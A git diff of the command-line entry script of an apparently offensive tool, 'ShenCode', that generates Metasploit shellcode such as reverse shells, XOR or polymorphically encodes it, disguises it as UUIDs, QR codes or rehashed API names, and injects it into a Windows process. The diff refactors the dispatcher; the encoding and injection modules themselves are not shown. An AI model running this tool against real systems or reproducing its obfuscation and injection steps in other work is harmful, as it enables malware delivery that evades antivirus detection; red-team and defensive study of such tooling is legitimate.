@@ -1,41 +1,26 @@
-"""
-
-"""
-
 import argparse
 import os
 
-import utils.assist as assist
+import utils.arg as arg
+from utils.helper import nstate as nstate
+import utils.extract as extract
+import utils.formatout as formatout
+import utils.injection as injection
 import utils.msf as msf
-import utils.shellcode as sc
-import utils.obfuscating as obf
+import encoder.xorpoly as xorpoly
+import encoder.xor as xor
+import obfuscator.qrcode as qrcode
+import obfuscator.rolhash as rolhash
+import obfuscator.uuid as uuid
 
-Version = '0.4.3'
+Version = '0.5.0'
 
-if os.name == 'nt':
 # make sure your metasploit binary folder is in your PATH variable
+if os.name == 'nt':
   msfvenom_path = "msfvenom.bat"
 elif os.name == 'posix':
   msfvenom_path = 'msfvenom'
   
-dll_paths = ['C:\\Windows\\System32\\kernel32.dll', 
-             'C:\\Windows\\System32\\ws2_32.dll', 
-             'C:\\Windows\\System32\\wininet.dll', 
-             'C:\\Windows\\System32\\dnsapi.dll',
-             'C:\\Windows\\System32\\mswsock.dll']
-
-class nstate:
-    HEADER = '\033[95m'
-    OKBLUE = '\033[94m[*]\033[0m'
-    OKCYAN = '\033[96m'
-    OKGREEN = '\033[92m[+]\033[0m'
-    WARNING = '\033[93m'
-    FAIL = '\033[91m[-]\033[0m'
-    ENDC = '\033[0m'
-    BOLD = '\033[1m'
-    UNDERLINE = '\033[4m'
-    LINK = '\033[94m\033[4m'
-
 def main(command_line=None):
   print(f"{nstate.HEADER}")
   print(f"  _______   __                      _______              __         ")
@@ -46,72 +31,105 @@ def main(command_line=None):
   print(f" |::.. . |                         |::.. . |                        ")
   print(f" `-------\'                         `-------\'                      ")
   print(f"Version {Version} by psycore8 -{nstate.ENDC} {nstate.LINK}https://www.nosociety.de{nstate.ENDC}") 
-  parser = argparse.ArgumentParser(description="create and obfuscate shellcodes")
-  parser.add_argument("-o", "--output", choices=["c","casm","cs","ps1","py","hex","inspect"], help="formatting the shellcode in C, Casm, C#, Powershell, python or hex")
-  subparsers = parser.add_subparsers(dest='command')
-  parser_create = subparsers.add_parser("create", help="create a shellcode using msfvenom")
-  parser_create.add_argument("-p", "--payload", help="payload to use e.g. windows/shell_reverse_tcp")
-  parser_create.add_argument("-lh", "--lhost", help="LHOST Argument")
-  parser_create.add_argument("-lp", "--lport", help="LPORT Argument")
-  parser_create.add_argument("-c", "--cmd", type=str, help="msfvenom command line, use quotation marks and equal sign e.g --cmd=\"-p ...\"")
-  parser_encode = subparsers.add_parser("encode", help="encode windows function hashes to ROL")
-  parser_encode.add_argument("-f", "--filename", help="raw input file with shellcode")
-  parser_encode.add_argument("-o", "--outputfile", help="raw input file with shellcode")
+
+  ##########################
+  ### BEGIN INIT SECTION ###
+  ##########################
+
+  arg.CreateMainParser()
+  extract.extract_shellcode.init()
+  formatout.format.init()
   if os.name == 'nt':
-    parser_encode.add_argument("-r", "--ror2rol", action="store_true", help="change ROR13 to ROL encoding")
-    parser_encode.add_argument("-rk", "--key", help="ROL key for encoding")
-  parser_encode.add_argument("-x", "--xor",   action="store_true", help="use additional XOR encoding")
-  parser_encode.add_argument("-xk", "--xorkey", help="XOR key for encoding")
-  parser_encode.add_argument("-q", "--qrcode",   action="store_true", help="store your payload in QR Code picture")
-  parser_encode.add_argument("-u", "--uuid",   action="store_true", help="Obfuscate Shellcode as UUID")
-  parser_encode = subparsers.add_parser("extract", help="extract shellcode from/to pattern")
-  parser_encode.add_argument("-f", "--filename", help="inputfile")
-  parser_encode.add_argument("-o", "--outputfile", help="outputfile")
-  parser_encode.add_argument("-fb", "--first-byte", help="extract from here")
-  parser_encode.add_argument("-lb", "--last-byte", help="extract until here")
+    injection.inject.init()
+  msf.msfvenom.init()
+  qrcode.qrcode_obfuscator.init()
   if os.name == 'nt':
-    parser_inject = subparsers.add_parser("inject", help="inject shellcode")
-    parser_inject.add_argument("-f", "--filename", help="raw input file with shellcode to inject")
-    parser_inject.add_argument("-p", "--processname", help="raw input file with shellcode to inject")
-    parser_inject.add_argument("-s", "--startprocess", action="store_true", help="raw input file with shellcode to inject")
-  parser_output = subparsers.add_parser("output", help="create formatted output by filename")
-  parser_output.add_argument("-f", "--filename", help="raw input file with shellcode")
-  parser_output.add_argument("-s", "--syntax", help="formatting the shellcode in C, Casm, C#, Powershell, python or hex")
-  parser_output.add_argument("-l", "--lines", action="store_true", help="adds a line numbering after each 8 bytes")
-  parser_output.add_argument("-w", "--write", help="write output to the given filename (replacing $%BUFFER%$ placeholder in the file")
+    rolhash.ror2rol_obfuscator.init()
+  uuid.uuid_obfuscator.init()
+  xorpoly.xor.init()
+  xor.xor_encoder.init()
+  arguments = arg.ParseArgs(command_line)
+
+  ##########################
+  #### END INIT SECTION ####
+  ##########################
   
-  args = parser.parse_args(command_line)
-  OutputFormat = args.output
-  
-  if args.command == "create":
-    print(f'{args.cmd}')
+
+  # MAIN
+
+  if arguments.command == 'msfvenom':
     print(f"{nstate.OKBLUE} create payload")
     cs = msf.msfvenom
-    cs.CreateShellcodeEx(msfvenom_path, args.cmd)
+    cs.CreateShellcodeEx(msfvenom_path, arguments.cmd)
 
-  elif args.command == "encode":
-    filename = args.filename
-    out_file = args.outputfile
+  elif arguments.command == 'xorpoly':
+    xorpoly.xor.Input_File = arguments.input
+    xorpoly.xor.XOR_Key = arguments.key
+    xorpoly.xor.Output_File = arguments.output
+    xorpoly.xor.Template_File = 'tpl\\xor-stub.tpl'
+    print(f"{nstate.OKBLUE} Reading shellcode")
+    try: 
+      with open(arguments.input, "rb") as file:
+        shellcode = file.read()
+    except FileNotFoundError:
+      print(f"{nstate.FAIL} File not found or cannot be opened.")
+      exit()
+    modified_shellcode = xor.xor_encoder.xor_crypt_bytes(shellcode, int(arguments.key))
+    outputfile = 'xor.tmp'
+    with open(outputfile, 'wb') as file:
+      file.write(modified_shellcode)
+    path = outputfile
+    cf = os.path.isfile(path)
+    if cf == True:
+      print(f"{nstate.OKGREEN} XOR encoded shellcode created in {outputfile}")
+    else:
+      print(f"{nstate.FAIL} XOR encoded Shellcode error, aborting script execution")
+      exit()
+    xorpoly.xor.Input_File = outputfile
+    xorpoly.xor.process()
 
-    if args.ror2rol:
-      ror_key = int(args.key)
+  elif arguments.command == 'uuid':
+      short_fn = os.path.basename(arguments.input)
+      ou = uuid.uuid_obfuscator
+      print(f"{nstate.OKBLUE} try to open file")
+      if ou.open_file(arguments.input):
+        print(f"{nstate.OKGREEN} reading {short_fn} successful!")
+      else:
+        print(f"{nstate.FAIL} file not found, exit")
+      print(f"{nstate.OKBLUE} try to generate UUIDs")  
+      print(ou.CreateVar())
+
+  elif arguments.command == 'formatout':
+      filename = arguments.input
+      OutputFormat = arguments.syntax
+      lines = arguments.lines
+      print(filename)
+      print(f"{nstate.OKBLUE} processing shellcode format...")
+      fo = formatout.format
+      scFormat = fo.process(filename,OutputFormat,lines)
+      print(scFormat)
+      if arguments.write:
+        fo.FileManipulation.WriteToTemplate(arguments.write, scFormat)
+        print(f"{nstate.OKGREEN} Output written in buf {arguments.write}")
+      print(f"{nstate.OKGREEN} DONE!")
+
+  elif arguments.command == 'ror2rol':
+      ror_key = int(arguments.key)
       if (ror_key < 32) or (ror_key > 255):
         print(f"{nstate.FAIL} Key must be between 33 and 255")
         exit()
-      ror2rol = sc.ror2rol
-      ror2rol.process(dll_paths, filename, out_file, args.key)
+      rolhash.ror2rol_obfuscator.process(arguments.input, arguments.output, arguments.key)
 
-    if args.xor:
-      xor = sc.xor
+  elif arguments.command == 'xorenc':
       print(f"{nstate.OKBLUE} Reading shellcode")
       try: 
-        with open(filename, "rb") as file:
+        with open(arguments.input, "rb") as file:
           shellcode = file.read()
       except FileNotFoundError:
           print(f"{nstate.FAIL} File not found or cannot be opened.")
           exit()
-      modified_shellcode = xor.xor_crypt_bytes(shellcode, int(args.xorkey))
-      outputfile = out_file
+      modified_shellcode = xor.xor_encoder.xor_crypt_bytes(shellcode, int(arguments.key))
+      outputfile = arguments.output
       with open(outputfile, 'wb') as file:
         file.write(modified_shellcode)
       path = outputfile
@@ -122,98 +140,26 @@ def main(command_line=None):
         print(f"{nstate.FAIL} XOR encoded Shellcode error, aborting script execution")
         exit()
 
-    if args.uuid:
-      short_fn = os.path.basename(filename)
-      ou = obf.obf_uuid
-      print(f"{nstate.OKBLUE} try to open file")
-      if ou.open_file(filename):
-        print(f"{nstate.OKGREEN} reading {short_fn} successful!")
-      else:
-        print(f"{nstate.FAIL} file not found, exit")
-      print(f"{nstate.OKBLUE} try to generate UUIDs")  
-      print(ou.CreateVar())
-
-    if args.qrcode:
-      short_fn = os.path.basename(filename)
-      oq = obf.obf_qrcode
-      if oq.open_file(filename):
-        print(f'{nstate.OKGREEN} reading {short_fn} successful!')
-      else:
-        print(f'{nstate.FAIL} file not found, exit')
-      oq.SetOutputFile(out_file)
-      # if not oq.SetOutputFile(out_file):
-      #   print(f"{nstate.FAIL} output Filename was not set --> {obf.obf_qrcode.OutputFilename}") 
-      #   exit()
-      # else:
-      #   print(f"{nstate.OKGREEN} filename was set to {obf.obf_qrcode.OutputFilename}") 
-      print(f'Shellcode Size: {len(obf.obf_qrcode.Shellcode)}')
-      #print(f'Output: {obf.obf_qrcode.Out_File}')
-      oq.process()
-      path = out_file
-      cf = os.path.isfile(path)
-      if cf == True:
-        print(f'{nstate.OKGREEN} QR-Code creation successful: {out_file}')
-      else:
-        print(f'{nstate.FAIL} error creating QR-Code')
-        exit()
-
-  elif args.command == "extract":
-    if args.outputfile == "":
-      print(f"{nstate.FAIL} please provide an output filename!")
-      exit()
-    print(f"{nstate.OKBLUE} try to open file")
-    filename = args.filename
-    short_fn = os.path.basename(filename)
-    try:
-      with open(filename, "rb") as file:
-        shellcode = file.read()
-        print(f"{nstate.OKGREEN} reading {short_fn} successful!")
-    except FileNotFoundError:
-      print(f"{nstate.FAIL} file not found, exit")
-      exit()
-    print(f"{nstate.OKBLUE} cutting shellcode from {args.first_byte} to {args.last_byte}")
-    shellcode_new = shellcode[int(args.first_byte):int(args.last_byte)]
-    with open(args.outputfile, 'wb') as file:
-      file.write(shellcode_new)
-    path = args.outputfile
-    cf = os.path.isfile(path)
-    short_fn = os.path.basename(args.outputfile)
-    if cf == True:
-      print(f"{nstate.OKGREEN} written shellcode to {short_fn}")
-    else:
-      print(f"{nstate.OKFAIL} error while writing")
-      exit()
-
-
-  elif args.command == "inject":
+  elif arguments.command == 'inject':
     print(f"{nstate.OKBLUE} Reading shellcode")
-    filename = args.filename
+    filename = arguments.input
     try: 
       with open(filename, "rb") as file:
         shellcode = file.read()
     except FileNotFoundError:
         print(f"{nstate.FAIL} File not found or cannot be opened.")
         exit()
-    inject = sc.inject
+    inject = injection.inject
     inject.Shellcode = shellcode
-    inject.StartProcess = args.startprocess
-    inject.Target_Process = args.processname
+    inject.StartProcess = arguments.start
+    inject.Target_Process = arguments.process
     inject.start_injection()
 
-  if args.output or args.command == 'output':
-   if args.command == 'output':
-     filename = args.filename
-     OutputFormat = args.syntax
-     lines = args.lines
-   print(filename)
-   print(f"{nstate.OKBLUE} processing shellcode format...")
-   b2s = assist.bin2sc
-   scFormat = b2s.process(filename,OutputFormat,lines)
-   print(scFormat)
-   if args.write:
-     assist.FileManipulation.WriteToTemplate(args.write, scFormat)
-     print(f"{nstate.OKGREEN} Output written in buf {args.write}")
-  print(f"{nstate.OKGREEN} DONE!")
+  elif arguments.command == 'extract':
+    extract.extract_shellcode.process(arguments.input, arguments.output, arguments.first_byte, arguments.last_byte)
+
+  elif arguments.version:
+    print(f'ShenCode {Version}')
 
 if __name__ == "__main__":
   main()
